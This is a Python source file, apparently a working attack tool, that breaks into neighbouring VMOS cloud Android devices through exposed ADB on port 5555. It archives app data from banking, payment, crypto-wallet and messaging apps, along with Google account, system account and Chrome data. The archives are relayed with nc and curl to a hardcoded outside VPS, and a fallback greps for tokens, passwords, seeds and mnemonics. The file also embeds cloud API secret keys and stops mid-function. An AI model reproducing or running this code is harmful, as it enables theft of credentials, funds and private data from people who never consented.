#!/usr/bin/env python3
"""
Device Cloner v1.0 — Extract neighbor data to VPS local storage
================================================================
Extracts app data, databases, shared_prefs, accounts, and APKs from
neighbor VMOS devices → relays through our device → pushes to VPS disk.

Identity is saved as METADATA ONLY (JSON reference) — never injected
into our device. Our device identity stays untouched.

Architecture:
  Neighbor:5555 ←(ADB relay)← Our Device ←(Cloud API)← VPS
  Neighbor tar → nc → Our Device → curl POST → VPS HTTP receiver → disk

Data flow per device:
  1. neighbor_cmd: get identity + app list (text, ~6 API calls)
  2. neighbor tar: package high-value app data on neighbor
  3. nc relay: pull tar from neighbor → /sdcard/.clone_tmp on our device
  4. curl POST: push from our device → VPS HTTP upload endpoint
  5. VPS saves to clone_backups/<ip>_<model>/

Usage:
  python3 tools/device_cloner.py clone <IP>              # Clone one device
  python3 tools/device_cloner.py clone-list <IP1,IP2..>  # Clone multiple
  python3 tools/device_cloner.py clone-top [N]           # Clone top N scored devices
  python3 tools/device_cloner.py status                  # Show clone status
  python3 tools/device_cloner.py identity <IP>           # Extract identity only
"""

import asyncio
import base64
import json
import os
import re
import struct
import sys
import time
import signal
import hashlib
from datetime import datetime
from pathlib import Path
from http.server import HTTPServer, BaseHTTPRequestHandler
import threading
import shutil

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))
from vmos_titan.core.vmos_cloud_api import VMOSCloudClient

# ═══════════════════════════════════════════════════════════════════════
# CONFIG
# ═══════════════════════════════════════════════════════════════════════

AK = "BPWNWxfXMQsjsREyzIOXmCtndRZO8iVi"
SK = "Q2SgcSwEfuwoedY0cijp6Mce"
PAD = "AC32010810392"
BASE_URL = "https://api.vmoscloud.com"
OUR_IP = "10.0.21.62"
VPS_IP = "51.68.33.34"
UPLOAD_PORT = 19850

CMD_DELAY = 3.5
TRANSFER_TIMEOUT = 90       # seconds per file relay (neighbor → our device)
MAX_TAR_SIZE_MB = 200        # skip if tar would be bigger

BASE_DIR = Path(__file__).resolve().parent.parent
CLONE_DIR = BASE_DIR / "clone_backups"
HOSTS_FILE = BASE_DIR / "tmp" / "fullscan_hosts.txt"
EXTRACTION_DB = BASE_DIR / "extractions" / "identity_progress.json"

# High-value packages worth cloning data for
HIGH_VALUE_PKGS = {
    "com.google.android.apps.walletnfcrel", "com.paypal.android.p2pmobile",
    "com.venmo", "com.squareup.cash", "com.revolut.revolut",
    "com.samsung.android.spay", "com.zellepay.zelle", "com.klarna.android",
    "io.metamask", "com.wallet.crypto.trustapp", "app.phantom",
    "com.coinbase.android", "com.binance.dev", "com.robinhood.android",
    "com.krakenfx.app", "piuk.blockchain.android", "com.crypto.exchange",
    "com.bybit.app", "com.okex.app", "com.chase.sig.android",
    "com.wf.wellsfargo", "com.bankofamerica.cashpro", "com.capitalone.mobile",
    "com.sofi.mobile", "com.chime.android", "co.mona.android",
    "com.starlingbank.android", "com.n26.app", "com.transferwise.android",
    "com.whatsapp", "com.whatsapp.w4b", "org.telegram.messenger",
    "com.instagram.android", "com.instagram.barcelona",
    "com.bank.vr", "com.glovo", "com.airbnb.android",
}

# Additional data directories to extract from neighbor (system-level)
SYSTEM_DATA_PATHS = [
    # GMS / Google Play Services
    ("/data/data/com.google.android.gms/shared_prefs", "gms_prefs"),
    ("/data/data/com.google.android.gms/databases", "gms_databases"),
    # GSF
    ("/data/data/com.google.android.gsf/databases", "gsf_databases"),
    ("/data/data/com.google.android.gsf/shared_prefs", "gsf_prefs"),
    # System accounts
    ("/data/system_ce/0", "system_accounts"),
    # Chrome
    ("/data/data/com.android.chrome/app_chrome/Default", "chrome_data"),
]


# ═══════════════════════════════════════════════════════════════════════
# ADB WIRE PROTOCOL (from proven extractor)
# ═══════════════════════════════════════════════════════════════════════

def _adb_checksum(data: bytes) -> int:
    return sum(data) & 0xFFFFFFFF

def _adb_magic(cmd: bytes) -> int:
    return struct.unpack("<I", cmd)[0] ^ 0xFFFFFFFF

def _build_adb_packet(cmd: bytes, arg0: int, arg1: int, data: bytes = b"") -> bytes:
    header = struct.pack("<4sIIIII", cmd, arg0, arg1,
                         len(data), _adb_checksum(data), _adb_magic(cmd))
    return header + data

def build_adb_cnxn() -> bytes:
    return _build_adb_packet(b"CNXN", 0x01000001, 256 * 1024, b"host::\x00")

def build_adb_open(local_id: int, service: str) -> bytes:
    return _build_adb_packet(b"OPEN", local_id, 0, service.encode() + b"\x00")


# ═══════════════════════════════════════════════════════════════════════
# VPS HTTP UPLOAD RECEIVER
# ═══════════════════════════════════════════════════════════════════════

class UploadReceiver:
    """Simple HTTP server on VPS that receives file uploads from device curl."""

    def __init__(self, port=UPLOAD_PORT):
        self.port = port
        self.server = None
        self.thread = None
        self._received = {}  # filename → local_path

    def start(self):
        receiver = self

        class Handler(BaseHTTPRequestHandler):
            def do_PUT(self):
                """Device does: curl -X PUT --data-binary @file http://VPS:port/filename"""
                filename = self.path.strip("/")
                if not filename or ".." in filename or filename.startswith("/"):
                    self.send_response(400)
                    self.end_headers()
                    self.wfile.write(b"bad filename")
                    return

                content_length = int(self.headers.get("Content-Length", 0))
                if content_length <= 0:
                    self.send_response(400)
                    self.end_headers()
                    self.wfile.write(b"no content")
                    return

                upload_dir = CLONE_DIR / "_incoming"
                upload_dir.mkdir(parents=True, exist_ok=True)
                dest = upload_dir / filename

                received = 0
                with open(dest, "wb") as f:
                    while received < content_length:
                        chunk_size = min(65536, content_length - received)
                        chunk = self.rfile.read(chunk_size)
                        if not chunk:
                            break
                        f.write(chunk)
                        received += len(chunk)

                receiver._received[filename] = str(dest)
                self.send_response(200)
                self.end_headers()
                self.wfile.write(f"OK {received}".encode())

            def do_POST(self):
                """Alias for PUT."""
                self.do_PUT()

            def log_message(self, fmt, *args):
                pass  # silent

        self.server = HTTPServer(("0.0.0.0", self.port), Handler)
        self.server.socket.settimeout(1)
        self.thread = threading.Thread(target=self._serve, daemon=True)
        self.thread.start()
        print(f"  [RECV] Upload receiver on port {self.port}")

    def _serve(self):
        while self.server:
            try:
                self.server.handle_request()
            except Exception:
                pass

    def stop(self):
        if self.server:
            self.server.server_close()
            self.server = None

    def get_received(self, filename: str) -> str | None:
        return self._received.get(filename)


# ═══════════════════════════════════════════════════════════════════════
# CLOUD BRIDGE (proven from extractor with file pull + push additions)
# ═══════════════════════════════════════════════════════════════════════

class CloneBridge:
    """Execute commands via VMOS Cloud API with ADB relay + file transfer."""

    def __init__(self):
        self.client = VMOSCloudClient(ak=AK, sk=SK, base_url=BASE_URL)
        self._last_cmd = 0.0
        self._cmd_count = 0
        self._cnxn_staged = {}

    async def _throttle(self):
        elapsed = time.time() - self._last_cmd
        if elapsed < CMD_DELAY:
            await asyncio.sleep(CMD_DELAY - elapsed)

    async def cmd(self, command: str, timeout: int = 30) -> str:
        """Execute shell on our device, return stdout."""
        await self._throttle()
        self._last_cmd = time.time()
        self._cmd_count += 1
        try:
            r = await asyncio.wait_for(
                self.client.sync_cmd(PAD, command, timeout_sec=timeout),
                timeout=timeout + 15,
            )
            data = r.get("data", [])
            if isinstance(data, list) and data:
                return (data[0].get("errorMsg", "") or "").strip()
            elif isinstance(data, dict):
                return (data.get("errorMsg", "") or "").strip()
            return ""
        except asyncio.TimeoutError:
            return "ERR:api_timeout"
        except Exception as e:
            return f"ERR:{e}"

    async def fire(self, command: str):
        """Fire async command (no output wait)."""
        await self._throttle()
        self._last_cmd = time.time()
        self._cmd_count += 1
        try:
            await self.client.async_adb_cmd([PAD], command)
        except Exception:
            pass

    async def _ensure_cnxn(self, ip: str):
        """Stage CNXN packet file on device (cached per IP)."""
        key = ip.replace(".", "_")
        if key not in self._cnxn_staged:
            b64 = base64.b64encode(build_adb_cnxn()).decode()
            await self.cmd(f"echo -n '{b64}' | base64 -d > /sdcard/.cnxn_{key}")
            self._cnxn_staged[key] = True

    async def neighbor_cmd(self, ip: str, shell_cmd: str, timeout: int = 8) -> str:
        """Execute shell command on neighbor via ADB relay.

        Proven method: staged CNXN/OPEN → nc pipe → response parsed with strings.
        Works around sync_cmd 2000-byte output limit via chunked reads.
        """
        ip_key = ip.replace(".", "_")
        tag = f"{hash(shell_cmd) & 0xFFFF:04x}"

        await self._ensure_cnxn(ip)

        # Stage OPEN packet
        open_pkt = build_adb_open(1, f"shell:{shell_cmd}")
        b64_open = base64.b64encode(open_pkt).decode()
        await self.cmd(f"echo -n '{b64_open}' | base64 -d > /sdcard/.o{tag}")

        # Fire relay
        relay_cmd = (
            f"(cat /sdcard/.cnxn_{ip_key}; sleep 0.3; cat /sdcard/.o{tag}; sleep {timeout}) | "
            f"timeout {timeout + 2} nc {ip} 5555 > /sdcard/.r{tag} 2>/dev/null"
        )
        await self.fire(relay_cmd)
        await asyncio.sleep(timeout + 4)

        # Parse on-device with strings (avoids 2000-byte truncation)
        info = await self.cmd(
            f"strings -n 3 /sdcard/.r{tag} | "
            f"grep -v -E '^(CNXN|OKAY|WRTE|CLSE|OPEN)' | "
            f"grep -v -e '^host::' -e '^device::' "
            f"> /sdcard/.t{tag} 2>/dev/null; "
            f"echo TOTAL:$(wc -l < /sdcard/.t{tag} 2>/dev/null)"
        )

        total_lines = 0
        for line in (info or "").split("\n"):
            if line.startswith("TOTAL:"):
                try:
                    total_lines = int(line.split(":")[1].strip())
                except (ValueError, IndexError):
                    pass

        if total_lines == 0:
            await self.cmd(f"rm -f /sdcard/.o{tag} /sdcard/.r{tag} /sdcard/.t{tag}")
            return ""

        CHUNK = 30
        chunks = []
        for start in range(0, total_lines, CHUNK):
            if start == 0:
                chunk = await self.cmd(f"head -{CHUNK} /sdcard/.t{tag}")
            else:
                chunk = await self.cmd(f"tail -n +{start + 1} /sdcard/.t{tag} | head -{CHUNK}")
            if chunk:
                chunks.append(chunk)

        await self.cmd(f"rm -f /sdcard/.o{tag} /sdcard/.r{tag} /sdcard/.t{tag}")
        return "\n".join(chunks).strip()

    async def pull_file_from_neighbor(self, ip: str, remote_path: str,
                                       device_dest: str, timeout: int = TRANSFER_TIMEOUT) -> int:
        """Pull a file from neighbor → our device via nc relay.

        Proven method (verified 66MB APK, MD5 match):
          1. Kill stale nc on port
          2. Stage ADB OPEN with cat|nc command
          3. Start nc listener on our device (async_adb_cmd)
          4. Fire ADB relay (async_adb_cmd)
          5. Fixed wait (NO syncCmd during transfer)
          6. Check file size

        Returns bytes received (0 = failed).
        """
        port = 19870 + (hash(remote_path) & 0xFF)
        ip_key = ip.replace(".", "_")

        # Kill stale nc + cleanup
        await self.cmd(f"pkill -f 'nc.*{port}' 2>/dev/null; rm -f {device_dest} /sdcard/.xfer_open")

        # Stage ADB OPEN packet for cat|nc command
        await self._ensure_cnxn(ip)
        shell_cmd = f"cat {remote_path} | nc -w 10 {OUR_IP} {port}"
        open_pkt = build_adb_open(1, f"shell:{shell_cmd}")
        b64_open = base64.b64encode(open_pkt).decode()
        await self.cmd(f"echo -n '{b64_open}' | base64 -d > /sdcard/.xfer_open")

        # Start nc listener on our device
        await self.fire(f"nc -l -p {port} > {device_dest}")
        await asyncio.sleep(2)

        # Fire ADB relay
        relay_cmd = (
            f"(cat /sdcard/.cnxn_{ip_key}; sleep 0.3; cat /sdcard/.xfer_open; "
            f"sleep {timeout}) | "
            f"timeout {timeout + 5} nc {ip} 5555 > /dev/null 2>&1"
        )
        await self.fire(relay_cmd)

        # FIXED WAIT — NO syncCmd during transfer
        await asyncio.sleep(timeout + 5)

        # Check file size
        size_str = await self.cmd(f"wc -c < {device_dest} 2>/dev/null || echo 0")
        try:
            size = int(size_str.strip())
        except ValueError:
            size = 0

        # Cleanup
        await self.cmd(f"pkill -f 'nc.*{port}' 2>/dev/null; rm -f /sdcard/.xfer_open")
        return size

    async def push_file_to_vps(self, device_path: str, filename: str) -> bool:
        """Push file from our device → VPS via curl PUT to HTTP receiver.

        VPS runs UploadReceiver on UPLOAD_PORT.
        Device does: curl -X PUT --data-binary @file http://VPS:port/filename
        """
        url = f"http://{VPS_IP}:{UPLOAD_PORT}/{filename}"
        # Fire curl in background, then poll for completion
        await self.fire(
            f"nohup curl -s -X PUT -H 'Content-Type: application/octet-stream' "
            f"--data-binary @{device_path} '{url}' "
            f"> /sdcard/.push_result 2>&1 &"
        )

        # Poll for curl completion (check result file)
        for i in range(120):  # up to ~10 min
            await asyncio.sleep(5)
            result = await self.cmd("cat /sdcard/.push_result 2>/dev/null")
            if result and result.startswith("OK"):
                await self.cmd("rm -f /sdcard/.push_result")
                return True
            if result and "ERR" in result:
                break

        await self.cmd("rm -f /sdcard/.push_result")
        return False

    @property
    def api_calls(self) -> int:
        return self._cmd_count


# ═══════════════════════════════════════════════════════════════════════
# EXTRACTION LOGIC
# ═══════════════════════════════════════════════════════════════════════

def _parse_sections(text: str) -> dict:
    sections = {}
    current = None
    lines_buf = []
    for line in text.split("\n"):
        line = line.strip()
        if line.startswith("===") and line.endswith("==="):
            if current:
                sections[current] = lines_buf
            current = line.strip("=")
            lines_buf = []
        elif current and line:
            lines_buf.append(line)
    if current:
        sections[current] = lines_buf
    return sections


async def extract_identity(bridge: CloneBridge, ip: str) -> dict:
    """Extract full identity + app list from neighbor. Returns metadata dict."""
    compound = (
        "echo '===IDENTITY==='; "
        "echo MODEL:$(getprop ro.product.model); "
        "echo BRAND:$(getprop ro.product.brand); "
        "echo MANUF:$(getprop ro.product.manufacturer); "
        "echo DEVICE:$(getprop ro.product.device); "
        "echo SERIAL:$(getprop ro.serialno); "
        "echo IMEI:$(getprop persist.sys.cloud.imeinum); "
        "echo ANDROID:$(getprop ro.build.version.release); "
        "echo SDK:$(getprop ro.build.version.sdk); "
        "echo BUILDID:$(getprop ro.build.display.id); "
        "echo FP:$(getprop ro.build.fingerprint); "
        "echo BOARD:$(getprop ro.product.board); "
        "echo HARDWARE:$(getprop ro.hardware); "
        "echo '===SHELL==='; "
        "id | head -1; "
        "echo '===THIRD_PARTY==='; "
        "pm list packages -3 2>/dev/null; "
        "echo '===ACCOUNTS==='; "
        "dumpsys account 2>/dev/null | grep -E 'Account \\{|name=' | head -20; "
        "echo '===DISK==='; "
        "df /data/ 2>/dev/null | tail -1; "
        "echo '===END===';"
    )
    out = await bridge.neighbor_cmd(ip, compound, timeout=10)

    if not out or "===IDENTITY===" not in out:
        return {"ip": ip, "status": "unreachable", "error": (out or "no response")[:200]}

    sections = _parse_sections(out)

    props_raw = sections.get("IDENTITY", [])
    props = {}
    for line in props_raw:
        if ":" in line:
            key, _, val = line.partition(":")
            props[key.strip()] = val.strip()

    identity = {
        "model": props.get("MODEL", ""),
        "brand": props.get("BRAND", ""),
        "manufacturer": props.get("MANUF", ""),
        "device": props.get("DEVICE", ""),
        "serial": props.get("SERIAL", ""),
        "imei": props.get("IMEI", ""),
        "android_version": props.get("ANDROID", ""),
        "sdk": props.get("SDK", ""),
        "build_id": props.get("BUILDID", ""),
        "fingerprint": props.get("FP", ""),
        "board": props.get("BOARD", ""),
        "hardware": props.get("HARDWARE", ""),
    }

    shell_lines = sections.get("SHELL", [])
    shell_access = "root" if any("uid=0" in l for l in shell_lines) else "shell"

    third_party = [p.replace("package:", "").strip()
                   for p in sections.get("THIRD_PARTY", []) if p.startswith("package:")]
    accounts = sections.get("ACCOUNTS", [])
    disk = sections.get("DISK", [])

    high_value = [p for p in third_party if p in HIGH_VALUE_PKGS]

    return {
        "ip": ip,
        "status": "alive",
        "identity": identity,
        "shell": shell_access,
        "third_party": third_party,
        "third_party_count": len(third_party),
        "high_value_apps": high_value,
        "high_value_count": len(high_value),
        "accounts": accounts,
        "disk": disk,
        "extracted_at": datetime.now().isoformat(),
    }


async def clone_device(bridge: CloneBridge, ip: str, receiver: UploadReceiver) -> dict:
    """Full clone: identity + app data + system data → VPS disk.

    Identity is saved as metadata only — never applied to our device.
    """
    print(f"\n{'='*60}")
    print(f"  CLONING {ip}")
    print(f"{'='*60}")

    result = {"ip": ip, "started_at": datetime.now().isoformat()}

    # ── Phase 1: Identity extraction ──
    print(f"  [1/5] Extracting identity...")
    meta = await extract_identity(bridge, ip)

    if meta.get("status") != "alive":
        print(f"  ✗ Device unreachable: {meta.get('error', '')[:100]}")
        result["status"] = "unreachable"
        return result

    model = meta["identity"].get("model", "unknown")
    brand = meta["identity"].get("brand", "unknown")
    n_tp = meta["third_party_count"]
    n_hv = meta["high_value_count"]
    print(f"  ✓ {brand} {model} | {n_tp} apps | {n_hv} high-value | shell={meta['shell']}")

    # Create device backup directory on VPS
    safe_ip = ip.replace(".", "_")
    safe_model = re.sub(r'[^\w\-]', '_', model)[:30]
    device_dir = CLONE_DIR / f"{safe_ip}_{safe_model}"
    device_dir.mkdir(parents=True, exist_ok=True)
    result["device_dir"] = str(device_dir)
    result["identity"] = meta["identity"]
    result["model"] = model

    # Save identity metadata (REFERENCE ONLY — never injected)
    with open(device_dir / "identity.json", "w") as f:
        json.dump(meta, f, indent=2)
    print(f"  ✓ Identity saved to {device_dir}/identity.json (metadata only)")

    # ── Phase 2: Tar high-value app data on neighbor ──
    hv_apps = meta["high_value_apps"]
    if not hv_apps:
        # Clone ALL third-party apps if no high-value ones
        hv_apps = meta["third_party"][:15]  # cap at 15

    if not hv_apps:
        print(f"  ⚠ No apps to clone")
        result["status"] = "no_apps"
        result["completed_at"] = datetime.now().isoformat()
        return result

    print(f"\n  [2/5] Packaging {len(hv_apps)} app(s) on neighbor...")

    # Build tar command that packages app data directories
    tar_paths = []
    for pkg in hv_apps:
        tar_paths.append(f"/data/data/{pkg}/shared_prefs")
        tar_paths.append(f"/data/data/{pkg}/databases")
        tar_paths.append(f"/data/data/{pkg}/files")
        tar_paths.append(f"/data/data/{pkg}/no_backup")

    # Create per-app tars on neighbor to avoid one giant tar
    # First, check which paths actually exist
    check_cmd = "for d in " + " ".join(tar_paths[:40]) + "; do [ -d $d ] && echo EXISTS:$d; done"
    existing = await bridge.neighbor_cmd(ip, check_cmd, timeout=10)
    existing_paths = [l.split("EXISTS:")[1] for l in (existing or "").split("\n")
                      if l.startswith("EXISTS:")]
    print(f"  ✓ {len(existing_paths)} data directories found")

    if not existing_paths:
        print(f"  ⚠ No app data directories accessible")
        result["status"] = "no_data"
        result["completed_at"] = datetime.now().isoformat()
        return result

    # Create master tar on neighbor (all app data in one archive)
    tar_list = " ".join(existing_paths)
    tar_dest = "/data/local/tmp/.clone_appdata.tar.gz"

    # Tar with gzip on neighbor
    tar_cmd = f"tar czf {tar_dest} {tar_list} 2>/dev/null; wc -c < {tar_dest} 2>/dev/null || echo 0"
    print(f"  Creating tar on neighbor...")
    tar_result = await bridge.neighbor_cmd(ip, tar_cmd, timeout=30)

    tar_size = 0
    for line in (tar_result or "").split("\n"):
        line = line.strip()
        if line.isdigit():
            tar_size = int(line)

    if tar_size == 0:
        print(f"  ⚠ Tar creation failed on neighbor (might lack permissions)")
        # Fallback: extract text data via neighbor_cmd for each app
        await _extract_app_text_data(bridge, ip, hv_apps, device_dir)
        result["status"] = "text_only"
        result["completed_at"] = datetime.now().isoformat()
        _save_clone_result(result, device_dir)
        return result

    tar_mb = tar_size / 1048576
    print(f"  ✓ App data tar: {tar_mb:.1f}MB")

    if tar_mb > MAX_TAR_SIZE_MB:
        print(f"  ⚠ Tar too large ({tar_mb:.0f}MB > {MAX_TAR_SIZE_MB}MB limit)")
        result["status"] = "tar_too_large"
        result["completed_at"] = datetime.now().isoformat()
        _save_clone_result(result, device_dir)
        return result

    # ── Phase 3: Pull tar from neighbor → our device ──
    print(f"\n  [3/5] Pulling tar from neighbor → our device ({tar_mb:.1f}MB)...")
    device_tar = "/sdcard/.clone_appdata.tar.gz"

    pulled = await bridge.pull_file_from_neighbor(ip, tar_dest, device_tar, timeout=TRANSFER_TIMEOUT)
    pulled_mb = pulled / 1048576

    if pulled == 0:
        print(f"  ✗ File pull failed")
        # Fallback to text extraction
        await _extract_app_text_data(bridge, ip, hv_apps, device_dir)
        result["status"] = "pull_failed_text_fallback"
        result["completed_at"] = datetime.now().isoformat()
        _save_clone_result(result, device_dir)
        return result

    print(f"  ✓ Pulled {pulled_mb:.1f}MB to our device")

    # ── Phase 4: Push from our device → VPS ──
    print(f"\n  [4/5] Pushing to VPS ({pulled_mb:.1f}MB)...")
    upload_name = f"{safe_ip}_{safe_model}_appdata.tar.gz"

    ok = await bridge.push_file_to_vps(device_tar, upload_name)
    if ok:
        incoming = receiver.get_received(upload_name)
        if incoming:
            # Move to device directory
            final_path = device_dir / "appdata.tar.gz"
            shutil.move(incoming, str(final_path))
            print(f"  ✓ Saved to {final_path}")
            result["appdata_tar"] = str(final_path)
            result["appdata_size"] = os.path.getsize(str(final_path))

            # Extract tar locally on VPS
            apps_dir = device_dir / "apps"
            apps_dir.mkdir(exist_ok=True)
            os.system(f"tar xzf '{final_path}' -C '{apps_dir}' 2>/dev/null")
            extracted = list(apps_dir.rglob("*"))
            print(f"  ✓ Extracted {len(extracted)} files to {apps_dir}/")
            result["extracted_files"] = len(extracted)
        else:
            print(f"  ⚠ Upload completed but file not found on VPS")
            result["push_status"] = "upload_lost"
    else:
        print(f"  ✗ Push to VPS failed — saving via chunked base64 fallback")
        # Fallback: read file in base64 chunks via sync_cmd
        await _pull_via_base64(bridge, device_tar, device_dir / "appdata.tar.gz")

    # Cleanup device temp
    await bridge.cmd(f"rm -f {device_tar}")

    # ── Phase 5: System data extraction ──
    print(f"\n  [5/5] Extracting system data...")
    sys_tar_dest = "/data/local/tmp/.clone_sysdata.tar.gz"

    sys_paths = []
    for remote_path, label in SYSTEM_DATA_PATHS:
        sys_paths.append(remote_path)

    # Check which exist on neighbor
    sys_check = "for d in " + " ".join(sys_paths) + "; do [ -d $d ] && echo E:$d; done"
    sys_existing = await bridge.neighbor_cmd(ip, sys_check, timeout=10)
    sys_dirs = [l.split("E:")[1] for l in (sys_existing or "").split("\n") if l.startswith("E:")]

    if sys_dirs:
        sys_tar_cmd = f"tar czf {sys_tar_dest} {' '.join(sys_dirs)} 2>/dev/null; wc -c < {sys_tar_dest} 2>/dev/null || echo 0"
        sys_out = await bridge.neighbor_cmd(ip, sys_tar_cmd, timeout=30)
        sys_size = 0
        for line in (sys_out or "").split("\n"):
            if line.strip().isdigit():
                sys_size = int(line.strip())

        if sys_size > 0:
            sys_mb = sys_size / 1048576
            print(f"  ✓ System data tar: {sys_mb:.1f}MB")

            device_sys_tar = "/sdcard/.clone_sysdata.tar.gz"
            pulled_sys = await bridge.pull_file_from_neighbor(ip, sys_tar_dest, device_sys_tar, timeout=TRANSFER_TIMEOUT)

            if pulled_sys > 0:
                sys_upload_name = f"{safe_ip}_{safe_model}_sysdata.tar.gz"
                ok = await bridge.push_file_to_vps(device_sys_tar, sys_upload_name)
                if ok:
                    incoming = receiver.get_received(sys_upload_name)
                    if incoming:
                        final_sys = device_dir / "sysdata.tar.gz"
                        shutil.move(incoming, str(final_sys))
                        sys_apps_dir = device_dir / "system"
                        sys_apps_dir.mkdir(exist_ok=True)
                        os.system(f"tar xzf '{final_sys}' -C '{sys_apps_dir}' 2>/dev/null")
                        print(f"  ✓ System data extracted to {sys_apps_dir}/")
                        result["sysdata_tar"] = str(final_sys)
                else:
                    await _pull_via_base64(bridge, device_sys_tar, device_dir / "sysdata.tar.gz")

            await bridge.cmd(f"rm -f {device_sys_tar}")
        else:
            print(f"  ⚠ System data tar failed (permissions?)")
    else:
        print(f"  ⚠ No system data dirs accessible")

    # Clean up temp on neighbor
    cleanup = f"rm -f {tar_dest} {sys_tar_dest}"
    await bridge.neighbor_cmd(ip, cleanup, timeout=5)

    result["status"] = "complete"
    result["completed_at"] = datetime.now().isoformat()
    result["api_calls"] = bridge.api_calls
    _save_clone_result(result, device_dir)

    print(f"\n  ✓ CLONE COMPLETE: {ip} ({brand} {model})")
    print(f"    Saved to: {device_dir}/")
    return result


async def _extract_app_text_data(bridge: CloneBridge, ip: str,
                                  packages: list, device_dir: Path):
    """Fallback: extract app data as text via neighbor_cmd (no binary transfer)."""
    print(f"  [fallback] Extracting text data for {len(packages)} apps...")

    for pkg in packages:
        pkg_dir = device_dir / "apps" / "data" / "data" / pkg
        pkg_dir.mkdir(parents=True, exist_ok=True)

        compound = (
            f"echo '===PREFS==='; "
            f"cat /data/data/{pkg}/shared_prefs/*.xml 2>/dev/null | head -200; "
            f"echo '===DBS==='; "
            f"ls -la /data/data/{pkg}/databases/ 2>/dev/null; "
            f"echo '===FILES==='; "
            f"find /data/data/{pkg}/files/ -type f 2>/dev/null | head -30; "
            f"echo '===SENSITIVE==='; "
            f"grep -rihE 'token|key|secret|password|session|auth|cookie|access|refresh|jwt|bearer|credential|account|email|wallet|seed|mnemonic' "
            f"/data/data/{pkg}/shared_prefs/ 2>/dev/null | head -50; "
            f"echo '===END===';"
        )
        out = await bridge.neighbor_cmd(ip, compound, timeout=12)

        if out and "===PREFS===" in out:
            sections = _parse_sections(out)
            with open(pkg_dir / "text_extraction.json", "w") as f:
                json.dump(sections, f, indent=2)

            sensitive = sections.get("SENSITIVE", [])
            if sensitive:
                with open(pkg_dir / "sensitive.txt", "w") as f:
                    f.write("\n".join(sensitive))
                print(f"    ✓ {pkg}: {len(sensitive)} sensitive lines")
            else:
                print(f"    ○ {pkg}: extracted (no sensitive data)")
        else:
            print(f"    ✗ {pkg}: no data")


async def _pull_via_base64(bridge: CloneBridge, device_path: str, local_dest: Path):
    """Fallback: pull file from device to VPS via chunked base64 reads.
    Slow but works when curl POST fails. Max ~5MB practical limit.
    """
    print(f"  [b64 fallback] Pulling {device_path}...")

    # Get file size
    size_str = await bridge.cmd(f"wc -c < {device_path} 2>/dev/null || echo 0")
    try:
        total = int(size_str.strip())
    except ValueError:
        total = 0

    if total == 0:
        print(f"  ✗ File empty or missing")
        return

    # Read in 1400-byte base64 chunks (decodes to ~1050 bytes, fits sync_cmd limit)
    CHUNK_BYTES = 1400
    parts = []
    offset = 0

    while offset < total:
        b64_chunk = await bridge.cmd(
            f"dd if={device_path} bs=1 skip={offset} count={CHUNK_BYTES} 2>/dev/null | base64 | tr -d '\\n'"
        )
        if not b64_chunk or b64_chunk.startswith("ERR"):
            break
        parts.append(b64_chunk)
        offset += CHUNK_BYTES

    if parts:
        raw = b""
        for p in parts:
            try:
                padded = p + "=" * (-len(p) % 4)
                raw += base64.b64decode(padded)
            except Exception:
                pass

        local_dest.parent.mkdir(parents=True, exist_ok=True)
        with open(local_dest, "wb") as f:
            f.write(raw)
        print(f"  ✓ Saved {len(raw)} bytes via base64 to {local_dest}")


def _save_clone_result(result: dict, device_dir: Path):
    """Save clone result metadata."""
    with open(device_dir / "clone_result.json", "w") as f:
        json.dump(result, f, indent=2)


# ═══════════════════════════════════════════════════════════════════════
# STATUS / REPORTING
# ═══════════════════════════════════════════════════════════════════════

def show_status():
    """Show clone status of all backed-up devices."""
    print(f"\n{'='*60}")
    print(f"  CLONE BACKUP STATUS")
    print(f"{'='*60}")

    if not CLONE_DIR.exists():
        print("  No backups yet.")
        return

    devices = sorted(CLONE_DIR.iterdir())
    devices = [d for d in devices if d.is_dir() and d.name != "_incoming"]

    if not devices:
        print("  No device backups found.")
        return

    total_size = 0
    for d in devices:
        result_file = d / "clone_result.json"
        identity_file = d / "identity.json"

        status = "?"
        model = d.name
        size = sum(f.stat().st_size for f in d.rglob("*") if f.is_file())
        total_size += size

        if result_file.exists():
            with open(result_file) as f:
                r = json.load(f)
            status = r.get("status", "?")
            model = r.get("model", d.name)
        elif identity_file.exists():
            with open(identity_file) as f:
                meta = json.load(f)
            model = meta.get("identity", {}).get("model", d.name)
            status = "identity_only"

        files = list(d.rglob("*"))
        file_count = len([f for f in files if f.is_file()])
        size_str = f"{size/1048576:.1f}MB" if size > 1048576 else f"{size/1024:.0f}KB"

        icon = "✓" if status == "complete" else "○" if status == "identity_only" else "⚠"
        print(f"  {icon} {d.name:<40} {status:<20} {file_count:>4} files  {size_str:>8}")

    print(f"\n  Total: {len(devices)} devices, {total_size/1048576:.1f}MB")


def load_scored_devices() -> list[dict]:
    """Load previously extracted device data (with scores) from extraction DB."""
    if not EXTRACTION_DB.exists():
        return []
    with open(EXTRACTION_DB) as f:
        data = json.load(f)
    devices = data.get("devices", [])
    alive = [d for d in devices if d.get("status") == "alive"]
    alive.sort(key=lambda d: d.get("score", 0), reverse=True)
    return alive


# ═══════════════════════════════════════════════════════════════════════
# MAIN
# ═══════════════════════════════════════════════════════════════════════

async def main():
    if len(sys.argv) < 2:
        print(__doc__)
        return

    mode = sys.argv[1]

    if mode == "status":
        show_status()
        return

    # Start upload receiver for modes that need file transfer
    receiver = UploadReceiver()
    receiver.start()

    bridge = CloneBridge()
    CLONE_DIR.mkdir(parents=True, exist_ok=True)

    try:
        if mode == "identity":
            if len(sys.argv) < 3:
                print("Usage: device_cloner.py identity <IP>")
                return
            ip = sys.argv[2]
            meta = await extract_identity(bridge, ip)
            print(json.dumps(meta, indent=2))

        elif mode == "clone":
            if len(sys.argv) < 3:
                print("Usage: device_cloner.py clone <IP>")
                return
            ip = sys.argv[2]
            result = await clone_device(bridge, ip, receiver)
            print(f"\n  Result: {result.get('status')}")
            print(f"  API calls: {bridge.api_calls}")

        elif mode == "clone-list":
            if len(sys.argv) < 3:
                print("Usage: device_cloner.py clone-list <IP1,IP2,...>")
                return
            ips = sys.argv[2].split(",")
            results = []
            for i, ip in enumerate(ips):
                ip = ip.strip()
                print(f"\n  === Device {i+1}/{len(ips)}: {ip} ===")
                r = await clone_device(bridge, ip, receiver)
                results.append(r)

            print(f"\n{'='*60}")
            print(f"  BATCH COMPLETE: {len(results)} devices")
            complete = sum(1 for r in results if r.get("status") == "complete")
            print(f"  Complete: {complete}, Failed: {len(results)-complete}")
            print(f"  API calls: {bridge.api_calls}")

        elif mode == "clone-top":
            n = int(sys.argv[2]) if len(sys.argv) > 2 else 5
            devices = load_scored_devices()
            if not devices:
